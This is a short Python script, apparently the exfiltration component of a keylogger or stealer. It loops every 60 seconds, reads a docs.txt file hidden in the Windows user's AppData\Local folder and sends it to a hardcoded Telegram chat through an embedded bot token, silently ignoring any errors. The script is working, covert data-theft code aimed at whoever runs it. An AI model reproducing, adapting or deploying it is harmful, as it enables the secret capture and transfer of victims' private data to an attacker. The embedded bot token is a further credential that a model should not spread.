#!/usr/bin/python
import time
import os
import telebot

API_TOKEN = '5932908622:AAEOkoB8OHmtTgrinVroa9mtGXA6DmHMYSk'
bot = telebot.TeleBot(API_TOKEN)
def send():
    time.sleep(60)
    try:
        with open(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\docs.txt","rb") as file:
            readf=file.read()
        bot.send_document(1354459615, readf, caption=time.strftime("%m/%d/%Y, %H:%M:%S", time.localtime()))
    except:
        pass
    finally:
        send()

send()
